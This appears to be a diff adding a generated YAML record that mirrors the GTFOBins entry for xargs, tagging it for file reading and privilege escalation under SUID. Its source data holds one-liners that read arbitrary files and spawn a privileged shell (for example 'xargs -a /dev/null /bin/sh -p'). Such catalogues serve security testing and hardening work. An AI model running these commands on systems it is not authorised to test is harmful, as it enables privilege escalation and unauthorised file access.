@@ -1,0 +1,102 @@
+id: gtfobins/xargs/file-read/suid
+type: binary
+platform: linux
+name: xargs
+phases:
+- collection
+- privilege-escalation
+capabilities:
+- file-read
+privilege_required: suid
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: GPL-3.0
+  upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+  last_synced: '2026-11-13'
+commands:
+- template: xargs -a /path/to/input-file -0
+references:
+- https://gtfobins.github.io/gtfobins/xargs/
+tags:
+- linux
+- unix
+- gtfobins
+source_data:
+  GTFOBins:
+    raw:
+      documents:
+        xargs:
+          functions:
+            file-read:
+            - binary: false
+              code: xargs -a /path/to/input-file -0
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+              version: GNU
+            shell:
+            - code: xargs -a /dev/null /bin/sh
+              contexts:
+                sudo: null
+                suid:
+                  code: xargs -a /dev/null /bin/sh -p
+                  shell: false
+                unprivileged: null
+              version: GNU
+            - code: xargs -a /dev/null /bin/sh
+              contexts:
+                sudo: null
+                suid:
+                  code: xargs -a /dev/null /bin/sh -p
+                  shell: false
+                unprivileged: null
+            - code: echo x | xargs -o -a /dev/null /bin/sh
+              contexts:
+                sudo: null
+                suid:
+                  code: echo x | xargs -o -a /dev/null /bin/sh -p
+                  shell: false
+                unprivileged: null
+    upstream_url: https://gtfobins.github.io/gtfobins/xargs/
+    upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: file-read
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  phases:
+  - value: collection
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  - value: privilege-escalation
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  privilege_required:
+    value: suid
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    GTFOBins: sha256:00911269ad119aa62f66b6691d6c346d921d1f720266090f25477fa59ff9fc8b
